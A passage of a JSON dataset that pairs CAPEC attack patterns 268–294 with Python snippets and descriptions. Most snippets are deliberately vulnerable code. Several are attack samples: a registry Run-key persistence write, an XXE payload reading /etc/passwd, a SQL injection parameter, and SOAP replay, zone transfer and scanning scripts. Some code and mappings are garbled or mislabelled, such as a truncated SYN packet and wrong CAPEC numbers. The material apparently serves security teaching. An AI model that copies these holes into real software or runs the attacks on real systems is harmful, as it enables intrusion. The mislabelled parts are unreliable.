        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Leverage Alternate Encoding'. The function `handle_user_input` takes user input and attempts to validate it before canonicalizing it, which is a common mistake (CWE-180). The input is then canonicalized using `urllib.parse.unquote`, which decodes URL-encoded characters. The code constructs a file path using the canonicalized input (CWE-73) and attempts to open and read the file, potentially leading to directory traversal attacks. The validation step is ineffective because it occurs before the input is canonicalized, allowing encoded harmful input to bypass the validation check. This snippet highlights the importance of proper input validation and canonicalization order to prevent security vulnerabilities."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import logging\nimport os\n\n# Setup logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n# Function to simulate logging sensitive information\ndef log_sensitive_info(user_id, password):\n    logging.info(f'User ID: {user_id}, Password: {password}')\n\n# Function to simulate log manipulation\ndef manipulate_log():\n    with open('app.log', 'a') as log_file:\n        log_file.write('INFO: User ID: admin, Password: hacked_password\\n')\n\n# Simulate logging sensitive information\nlog_sensitive_info('user123', 'securepassword')\n\n# Simulate log manipulation by an attacker\nmanipulate_log()\n\n# Read and print the log file to show the manipulation\nwith open('app.log', 'r') as log_file:\n    print(log_file.read())",
        "description": "This Python code snippet demonstrates a scenario where an attacker can manipulate audit logs. The code sets up a basic logging mechanism and includes a function to log sensitive information (CWE-532). Another function simulates log manipulation by directly appending a forged log entry to the log file (CWE-117). The code then logs some sensitive information and manipulates the log to cover tracks or mislead an audit. Finally, it reads and prints the log file to show the manipulated entries. This example highlights the vulnerabilities associated with insufficient access controls and improper output neutralization in logging mechanisms, as described in the CAPEC."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import winreg\n\n# CWE-314: Cleartext Storage in the Registry\n# This code stores sensitive information in cleartext in the Windows Registry\n\ndef store_sensitive_info(key_path, value_name, sensitive_data):\n    try:\n        # Open the registry key\n        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)\n        # Store the sensitive data in cleartext\n        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, sensitive_data)\n        winreg.CloseKey(key)\n        print(f'Successfully stored {value_name} in the registry.')\n    except Exception as e:\n        print(f'Error storing data in registry: {e}')\n\n# Example usage\nstore_sensitive_info('Software\\MyApp', 'SensitiveInfo', 'my_secret_password')",
        "description": "This Python code snippet demonstrates a vulnerable practice of storing sensitive information in cleartext in the Windows Registry, which aligns with CWE-314 (Cleartext Storage in the Registry). The function `store_sensitive_info` takes a registry key path, a value name, and the sensitive data to be stored. It opens or creates the specified registry key and stores the sensitive data in cleartext. This practice can lead to security vulnerabilities as sensitive information is not protected and can be easily accessed by unauthorized users or malicious software. The code embodies the main idea of the deprecated CAPEC pattern 'Registry Manipulation' by showing how sensitive data can be improperly handled in the registry."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import winreg\n\n# Vulnerable code: Adding an entry to the Windows registry run key\ntry:\n    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n    winreg.SetValueEx(key, 'MaliciousApp', 0, winreg.REG_SZ, r'C:\\Path\\To\\MaliciousApp.exe')\n    winreg.CloseKey(key)\n    print('Registry key set successfully.')\nexcept Exception as e:\n    print(f'Failed to set registry key: {e}')",
        "description": "This Python code snippet demonstrates how an adversary can add a new entry to the Windows registry 'run keys' to ensure that a malicious application is executed every time a user logs in. The code uses the 'winreg' module to open the registry key located at 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' and sets a new value named 'MaliciousApp' with the path to the malicious executable. This action leverages CWE-15 (External Control of System or Configuration Setting) by allowing external control over the system's startup behavior. The code is a concise representation of the CAPEC 'Modification of Registry Run Keys' attack, which can be used to run persistent spyware or other malicious software with the user's permissions."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function to load and parse XML schema\n# CWE-15: External Control of System or Configuration Setting\n# CWE-501: Trust Boundary Violation\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef load_schema(schema_path):\n    try:\n        tree = ET.parse(schema_path)\n        root = tree.getroot()\n        return root\n    except ET.ParseError as e:\n        print(f\"Error parsing schema: {e}\")\n        return None\n\n# CWE-506: Embedded Malicious Code\n# CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n\ndef process_data(data, schema):\n    # Assume schema is trusted without validation\n    for element in schema.findall('.//element'):\n        tag = element.get('name')\n        if tag in data:\n            print(f\"Processing {tag}: {data[tag]}\")\n        else:\n            print(f\"Missing expected element: {tag}\")\n\n# Example usage\nschema_path = 'user_provided_schema.xml'  # This path can be controlled by an external user\nschema = load_schema(schema_path)\n\nif schema:\n    data = {'username': 'admin', 'password': 'secret'}\n    process_data(data, schema)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of loading and processing an XML schema, embodying the concept of Schema Poisoning (CAPEC). The `load_schema` function takes a file path to an XML schema, which can be controlled by an external user (CWE-15). The schema is parsed without validation, leading to a Trust Boundary Violation (CWE-501) and potential exposure of sensitive system information (CWE-497). The `process_data` function processes data based on the schema, assuming it is trusted, which can lead to the execution of embedded malicious code (CWE-506) and improper handling of sensitive information (CWE-212). This code highlights the risks associated with unvalidated and externally controlled schemas in an application."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 12345))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if data:\n        # Improper verification of source (CWE-940)\n        print(f'Received data: {data}')\n        # No integrity check (CWE-924)\n        if data == b'auth_request':\n            # Reflection attack vulnerability (CWE-301)\n            client_socket.send(b'auth_response')\n        elif data == b'auth_response':\n            print('Authenticated')\n        # Capture-replay vulnerability (CWE-294)\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections and processes authentication requests. The server does not properly verify the source of the communication (CWE-940), lacks message integrity checks (CWE-924), and is susceptible to reflection attacks (CWE-301) and capture-replay attacks (CWE-294). An attacker could exploit these vulnerabilities to impersonate a trusted user, replay captured authentication messages, or manipulate the communication protocol to gain unauthorized access."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import socket\n\n# Simulate a vulnerable HTTP server\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    request = client_socket.recv(1024).decode('utf-8')\n    \n    # Vulnerable to HTTP Response Smuggling\n    if 'Content-Length' in request:\n        headers, body = request.split('\\r\\n\\r\\n', 1)\n        content_length = int(headers.split('Content-Length: ')[1].split('\\r\\n')[0])\n        if len(body) < content_length:\n            body += client_socket.recv(content_length - len(body)).decode('utf-8')\n        \n        # Improper Neutralization of CRLF Sequences\n        if '\\r\\n' in body:\n            response = 'HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\\r\\nHello, World!\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\\r\\nInjected Response'\n        else:\n            response = 'HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\\r\\nHello, World!'\n    else:\n        response = 'HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\\r\\nHello, World!'\n    \n    client_socket.sendall(response.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet simulates a vulnerable HTTP server that is susceptible to HTTP Response Smuggling attacks. The server reads incoming HTTP requests and checks for the 'Content-Length' header. If present, it reads the specified amount of data, but it does not properly neutralize CRLF sequences in the body. This allows an attacker to inject a malicious HTTP response within the body, leading to HTTP Response Smuggling. The code demonstrates CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers) and CWE-444 (Inconsistent Interpretation of HTTP Requests), which are key weaknesses related to the CAPEC description."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "from flask import Flask, request, abort\n\napp = Flask(__name__)\n\n@app.route('/admin', methods=['GET'])\ndef admin_panel():\n    if request.method != 'GET':\n        abort(403)  # Only allow GET requests\n    return 'Admin Panel'\n\n@app.route('/admin', methods=['POST'])\ndef admin_panel_post():\n    return 'Admin Panel POST'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with an endpoint '/admin'. The endpoint is intended to be accessed only via the GET method, as indicated by the route decorator. However, the code also defines a POST method for the same endpoint, which is a potential security flaw. This setup can be exploited by an attacker using HTTP Verb Tampering to bypass access restrictions. The attacker can send a POST request to the '/admin' endpoint, which should ideally be restricted to GET requests only, thereby accessing the admin panel. This example embodies the main idea of CAPEC-274 (HTTP Verb Tampering) and highlights CWE-654 (Reliance on a Single Factor in a Security Decision) by relying solely on the HTTP method for access control."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import socket\nimport http.server\nimport threading\n\nclass RebindingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == '/rebind':\n            # Simulate DNS rebinding by changing the IP address\n            self.server.server_address = ('192.168.1.100', self.server.server_address[1])\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'Rebinding to internal IP')\n        else:\n            super().do_GET()\n\n# Bind to all IP addresses (CWE-1327)\nserver_address = ('0.0.0.0', 8080)\nhttpd = http.server.HTTPServer(server_address, RebindingHTTPRequestHandler)\n\n# Start the server in a separate thread\nthread = threading.Thread(target=httpd.serve_forever)\nthread.daemon = True\nthread.start()\n\nprint(f'Server started on {server_address[0]}:{server_address[1]}')\n\n# Simulate a client request to trigger DNS rebinding\nimport requests\nresponse = requests.get('http://localhost:8080/rebind')\nprint(response.text)\n\n# Simulate a client request to the new internal IP\nresponse = requests.get('http://192.168.1.100:8080')\nprint(response.text)",
        "description": "This Python code snippet demonstrates a simplified DNS rebinding attack. The `RebindingHTTPRequestHandler` class handles HTTP GET requests and simulates DNS rebinding by changing the server's IP address to an internal IP (192.168.1.100) when the '/rebind' path is accessed. The server is initially bound to all IP addresses (0.0.0.0), which is a common misconfiguration (CWE-1327). The server runs in a separate thread to allow for client requests. The code then simulates a client making a request to trigger the DNS rebinding and another request to the new internal IP address. This demonstrates how an attacker can manipulate DNS resolution to access internal network resources."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable function to send sensitive data over a network\n# CWE-319: Cleartext Transmission of Sensitive Information\ndef send_sensitive_data(data):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect(('example.com', 80))\n        s.sendall(data.encode('utf-8'))\n\n# Vulnerable function to receive data without integrity check\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\ndef receive_data():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind(('0.0.0.0', 8080))\n        s.listen()\n        conn, addr = s.accept()\n        with conn:\n            data = conn.recv(1024)\n            return data.decode('utf-8')\n\n# Example usage\nsensitive_info = 'username=admin&password=secret'\nsend_sensitive_data(sensitive_info)\nreceived_info = receive_data()\nprint(f'Received: {received_info}')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of inter-component communication, embodying the main idea of CAPEC-460: Inter-component Protocol Manipulation. The `send_sensitive_data` function transmits sensitive information in cleartext (CWE-319), making it susceptible to interception by unauthorized actors. The `receive_data` function receives data without verifying its integrity (CWE-924), allowing potential tampering during transmission. These vulnerabilities highlight the risks associated with improper handling of inter-component protocols, such as impersonation, data leakage, and unauthorized access."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Sample XML data with sensitive information\nxml_data = '''\n<order>\n    <customer>\n        <name>John Doe</name>\n        <credit_card>1234-5678-9012-3456</credit_card>\n    </customer>\n    <items>\n        <item>\n            <id>1</id>\n            <name>Widget</name>\n            <price>19.99</price>\n        </item>\n    </items>\n</order>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        return root\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n        return None\n\n# Function to manipulate XML data\n# CWE-707: Improper Neutralization\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\n\ndef manipulate_xml(data):\n    root = parse_xml(data)\n    if root is not None:\n        # CWE-201: Sensitive information is included in the sent data\n        sensitive_info = root.find('.//credit_card').text\n        print(f\"Sensitive Info: {sensitive_info}\")\n\n        # CWE-302: Authentication Bypass by modifying assumed-immutable data\n        root.find('.//name').text = 'Attacker'\n        manipulated_data = ET.tostring(root, encoding='unicode')\n        print(f\"Manipulated XML: {manipulated_data}\")\n\nmanipulate_xml(xml_data)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of XML data handling, embodying the main idea of CAPEC-272: Data Interchange Protocol Manipulation. The code parses and manipulates XML data, showcasing several related CWEs. It includes sensitive information (CWE-201) in the XML data, improperly neutralizes the XML input (CWE-707), and allows for authentication bypass by modifying assumed-immutable data (CWE-302). The function `manipulate_xml` extracts sensitive information and alters the customer's name, demonstrating how an attacker could exploit these vulnerabilities."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import requests\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-707: Improper Neutralization\n# CWE-573: Improper Following of Specification by Caller\n\n# Vulnerable web service endpoint\nurl = 'http://example.com/api/getUserData'\n\n# CWE-707: Manipulating call parameters to include unexpected values\nparams = {\n    'userId': '1 OR 1=1'  # SQL Injection attempt\n}\n\n# CWE-602: Client-side enforcement bypass\n# Assuming the client is supposed to enforce some security checks\nresponse = requests.get(url, params=params)\n\n# CWE-573: Improper following of specification\n# The server should properly validate and sanitize inputs\nif response.status_code == 200:\n    print('User data:', response.text)\nelse:\n    print('Failed to retrieve user data')",
        "description": "This Python code snippet demonstrates a web service protocol manipulation attack. The code sends a GET request to a vulnerable web service endpoint with manipulated parameters. The 'userId' parameter is injected with a SQL payload ('1 OR 1=1'), which is an example of CWE-707 (Improper Neutralization). The server-side security is assumed to be enforced by the client (CWE-602), which is bypassed in this example. The server does not properly validate and sanitize the input (CWE-573), leading to potential unauthorized data access. This snippet embodies the main idea of CAPEC-### by showing how an adversary can manipulate web service protocols to gain unauthorized access to data."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# SOAP request with potential XML External Entity (XXE) vulnerability\nsoap_request = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:GetData>\n         <web:input><![CDATA[<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>]]></web:input>\n      </web:GetData>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Sending the SOAP request to the server\nresponse = requests.post('http://example.com/soap', data=soap_request, headers={'Content-Type': 'text/xml'})\n\n# Parsing the response (potentially unsafe if the response contains malicious XML)\nroot = etree.fromstring(response.content)\n\n# Extracting data from the response\nresult = root.xpath('//web:output', namespaces={'web': 'http://example.com/webservices'})\nprint(result[0].text if result else 'No output')",
        "description": "This Python code snippet demonstrates a SOAP request that includes an XML External Entity (XXE) payload, which is a common vulnerability in XML-based protocols. The SOAP request is sent to a server, and the response is parsed without proper validation, potentially leading to security issues such as information disclosure. This example embodies the main idea of SOAP Manipulation (CAPEC) and highlights related weaknesses such as Improper Neutralization (CWE-707) and Improper Restriction of XML External Entity Reference (CWE-611). The code shows how an attacker might exploit these vulnerabilities to manipulate SOAP parameters and cause undesirable behavior on the server."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import requests\n\n# Vulnerable SOAP request\nwsdl_url = 'http://example.com/service?wsdl'\n\n# Exposing WSDL file containing sensitive information (CWE-651)\nresponse = requests.get(wsdl_url)\nif response.status_code == 200:\n    print('WSDL file content:')\n    print(response.text)\n\n# SOAP request with potential parameter tampering\nsoap_request = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservice\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:SomeService>\n         <web:parameter1>tampered_value</web:parameter1>\n      </web:SomeService>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\nheaders = {'Content-Type': 'text/xml'}\n\n# Sending the tampered SOAP request\nresponse = requests.post('http://example.com/service', data=soap_request, headers=headers)\nprint('Response status code:', response.status_code)\nprint('Response content:', response.text)\n\n# Capture-replay attack (CWE-294)\n# Replaying the same request to bypass authentication\nreplay_response = requests.post('http://example.com/service', data=soap_request, headers=headers)\nprint('Replay response status code:', replay_response.status_code)\nprint('Replay response content:', replay_response.text)\n",
        "description": "This Python code snippet demonstrates a SOAP parameter tampering attack, which is deprecated and included in CAPEC-279: SOAP Manipulation. The code first exposes a WSDL file (CWE-651), which may contain sensitive information about the web service. It then sends a tampered SOAP request to the web service, potentially altering the behavior of the service. Finally, it performs a capture-replay attack (CWE-294) by resending the same tampered request to bypass authentication. This code highlights the vulnerabilities associated with SOAP-based web services, including exposure of sensitive information and susceptibility to parameter tampering and replay attacks."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import os\nimport socket\n\n# Function to send ICMP Echo Request (Ping)\ndef send_ping(target_ip):\n    # Create a raw socket\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    except PermissionError:\n        print(\"Permission denied: Run as root.\")\n        return\n\n    # ICMP Echo Request packet\n    icmp_packet = b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # Type 8 (Echo), Code 0, Checksum 0\n\n    # Send the packet to the target IP\n    sock.sendto(icmp_packet, (target_ip, 1))\n    print(f\"Sent ICMP Echo Request to {target_ip}\")\n\n    # Receive the response\n    try:\n        response, _ = sock.recvfrom(1024)\n        print(f\"Received response from {target_ip}: {response}\")\n    except socket.timeout:\n        print(f\"No response from {target_ip}\")\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'  # Replace with the target IP address\n    send_ping(target_ip)\n",
        "description": "This Python code snippet demonstrates how to send an ICMP Echo Request (Ping) to a target IP address using raw sockets. The code creates a raw socket, constructs an ICMP Echo Request packet, and sends it to the specified target IP. It then waits for an ICMP Echo Reply from the target. This code embodies the main idea of the CAPEC by showing how an adversary might use a Ping to determine if a target system is responsive. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information) and CWE-319 (Cleartext Transmission of Sensitive Information), as the ICMP packets are sent in cleartext and can be sniffed by unauthorized actors. Additionally, the use of raw sockets requires elevated privileges, which can be related to CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime)."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import socket\n\n# Function to perform a TCP SYN scan\ndef syn_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct a SYN packet\n        syn_packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6'  # Simplified example\n        sock.sendto(syn_packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)\n        if response:\n            print(f'Port {target_port} is open on {target_ip}')\n        else:\n            print(f'Port {target_port} is closed on {target_ip}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nsyn_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic TCP SYN scan, which is a common technique used to determine the status of ports on a remote target. The code creates a raw socket and sends a simplified SYN packet to the target IP and port. If a response is received, it indicates that the port is open; otherwise, it is closed. This code embodies the main idea of the CAPEC by performing a SYN scan to gather information about the target system. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) and the risk of excessive attack surface (CWE-1125)."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# ICMP Echo Request (Ping) Packet\nICMP_ECHO_REQUEST = 8\n\n# Function to calculate checksum\ndef checksum(source_string):\n    sum = 0\n    count_to = (len(source_string) // 2) * 2\n    count = 0\n    while count < count_to:\n        this_val = source_string[count + 1] * 256 + source_string[count]\n        sum = sum + this_val\n        sum = sum & 0xffffffff\n        count = count + 2\n    if count_to < len(source_string):\n        sum = sum + source_string[len(source_string) - 1]\n        sum = sum & 0xffffffff\n    sum = (sum >> 16) + (sum & 0xffff)\n    sum = sum + (sum >> 16)\n    answer = ~sum\n    answer = answer & 0xffff\n    answer = answer >> 8 | (answer << 8 & 0xff00)\n    return answer\n\n# Function to create an ICMP packet\ndef create_packet(id):\n    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)\n    data = struct.pack('d', time.time())\n    my_checksum = checksum(header + data)\n    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), id, 1)\n    return header + data\n\n# Function to send ICMP Echo Request\ndef send_ping(dest_addr, timeout=1):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    except PermissionError as e:\n        print('Operation not permitted. Run as root.')\n        return\n    packet_id = int((id(timeout) * time.time()) % 65535)\n    packet = create_packet(packet_id)\n    sock.sendto(packet, (dest_addr, 1))\n    sock.close()\n\n# Vulnerable code: Sending ICMP Echo Request\nsend_ping('8.8.8.8')",
        "description": "This Python code snippet demonstrates the creation and sending of an ICMP Echo Request (Ping) packet, which is related to the deprecated CAPEC-285. The code constructs an ICMP packet, calculates its checksum, and sends it to a specified destination address. The vulnerability lies in the potential for misuse of ICMP Echo Requests for network reconnaissance or denial-of-service attacks. Additionally, the code uses raw sockets, which require elevated privileges, and this can be exploited if not properly managed. The related CWEs provide context on potential issues such as reliance on DNS lookups (CWE-350) and the use of non-ubiquitous APIs (CWE-589), which can lead to inconsistencies and security flaws."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import os\nimport subprocess\n\ndef check_authentication(user):\n    # CWE-287: Improper Authentication\n    if user == 'admin':\n        return True\n    return False\n\n# CWE-1316: Overlapping protected and unprotected regions\nprotected_files = ['/etc/shadow', '/etc/passwd']\nunprotected_files = ['/tmp/testfile', '/etc/passwd']\n\n# CWE-1229: Creation of Emergent Resource\nemergent_resource = '/tmp/emergent_resource'\n\n# Simulate an attack by accessing overlapping files\nfor file in unprotected_files:\n    if file in protected_files:\n        print(f'Accessing protected file through unprotected path: {file}')\n        with open(file, 'r') as f:\n            print(f.read())\n\n# Simulate authentication bypass\nuser = 'admin'\nif check_authentication(user):\n    print('Authentication bypassed, executing privileged command')\n    subprocess.run(['ls', '-la', '/root'])\nelse:\n    print('Authentication failed')",
        "description": "This Python code snippet demonstrates several security vulnerabilities based on the provided CAPEC and related CWEs. The `check_authentication` function improperly authenticates a user based on a simple string comparison, representing CWE-287 (Improper Authentication). The code also simulates an attack by accessing files that overlap between protected and unprotected regions, illustrating CWE-1316 (Overlapping protected and unprotected regions). Additionally, the code creates an emergent resource (`/tmp/emergent_resource`), which can be exploited by attackers, representing CWE-1229 (Creation of Emergent Resource). The overall idea is to show how infrastructure-based footprinting can lead to various security issues, including authentication bypass and unauthorized access to protected resources."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "import dns.resolver\n\n# Function to enumerate MX records for a given domain\ndef enumerate_mx_records(domain):\n    try:\n        # Query MX records\n        mx_records = dns.resolver.resolve(domain, 'MX')\n        for mx in mx_records:\n            print(f'MX Record: {mx.exchange} with priority {mx.preference}')\n    except dns.resolver.NoAnswer:\n        print('No MX records found.')\n    except dns.resolver.NXDOMAIN:\n        print('Domain does not exist.')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\n# Example usage\nenumerate_mx_records('example.com')",
        "description": "This Python code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using the `dns.resolver` module. The function `enumerate_mx_records` takes a domain name as input and attempts to resolve its MX records. If successful, it prints out the MX records along with their priority. The code handles common exceptions such as no MX records found, non-existent domain, and other general errors. This snippet embodies the main idea of CAPEC-Enumerate Mail Exchange (MX) Records by showing how an adversary might gather information about mail servers in a network. The related CWEs are indirectly represented by the potential exposure of sensitive information (CWE-200), reliance on DNS resolution (CWE-350), and the importance of correctly specifying and recording security-relevant information (CWE-223, CWE-224, CWE-941)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import dns.resolver\nimport dns.query\nimport dns.zone\n\n# Vulnerable DNS server address\nvulnerable_dns_server = '192.0.2.1'\n\n# Domain to perform zone transfer on\ndomain = 'example.com'\n\ntry:\n    # Perform a DNS zone transfer\n    zone = dns.zone.from_xfr(dns.query.xfr(vulnerable_dns_server, domain))\n    for name, node in zone.nodes.items():\n        print(zone[name].to_text(name))\nexcept Exception as e:\n    print(f'Zone transfer failed: {e}')",
        "description": "This Python code snippet demonstrates a DNS zone transfer attack, which exploits a misconfigured DNS server that allows zone transfers. The code attempts to transfer the DNS zone data from a specified vulnerable DNS server for a given domain. If successful, it prints out the zone data, which can include sensitive information about the network topology, IP addresses, and hostnames. This embodies the main idea of CAPEC-137 (DNS Zone Transfers) and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing internal network details to an unauthorized actor."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import socket\n\n# Function to perform a ping sweep\ndef ping_sweep(ip_range):\n    for ip in ip_range:\n        try:\n            # Create a socket\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(1)\n            # Attempt to connect to the host\n            result = sock.connect_ex((ip, 80))\n            if result == 0:\n                print(f'Host {ip} is alive')\n            else:\n                print(f'Host {ip} is not responding')\n            sock.close()\n        except Exception as e:\n            print(f'Error pinging {ip}: {e}')\n\n# Example IP range\nip_range = ['192.168.1.1', '192.168.1.2', '192.168.1.3']\nping_sweep(ip_range)",
        "description": "This Python code snippet performs a basic 'ping sweep' to discover live hosts within a given IP range. The function `ping_sweep` iterates over a list of IP addresses, attempting to establish a TCP connection on port 80 (HTTP). If the connection is successful, it prints that the host is alive; otherwise, it prints that the host is not responding. This embodies the main idea of CAPEC-292 (Host Discovery) by probing IP addresses to determine if hosts are active. The code also touches on CWE-291 (Reliance on IP Address for Authentication) as it uses IP addresses to identify hosts, and CWE-319 (Cleartext Transmission of Sensitive Information) since the connection attempt is made over an unencrypted channel."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to perform traceroute\ndef traceroute(dest_name, max_hops=30):\n    dest_addr = socket.gethostbyname(dest_name)\n    port = 33434\n    ttl = 1\n    while ttl <= max_hops:\n        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        send_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        send_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)\n        recv_socket.bind(('', port))\n        send_socket.sendto(b'', (dest_addr, port))\n        start_time = time.time()\n        try:\n            data, curr_addr = recv_socket.recvfrom(512)\n            curr_addr = curr_addr[0]\n            elapsed_time = (time.time() - start_time) * 1000\n            print(f'{ttl}\t{curr_addr}\t{elapsed_time:.2f} ms')\n        except socket.error:\n            print(f'{ttl}\t*\tRequest timed out.')\n        finally:\n            send_socket.close()\n            recv_socket.close()\n        ttl += 1\n        if curr_addr == dest_addr:\n            break\n\n# Example usage\ntraceroute('example.com')",
        "description": "This Python code snippet performs a traceroute to a specified destination. It sends UDP packets with incrementing TTL values to map out the route data takes through the network. The code captures ICMP messages generated by intermediate routers when the TTL expires, revealing the route's topology. This process can expose sensitive network information (CWE-200, CWE-497) and the data is transmitted in cleartext (CWE-319), making it vulnerable to unauthorized actors. The code demonstrates how an adversary might use traceroute to gather network topology information, aligning with the CAPEC description."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
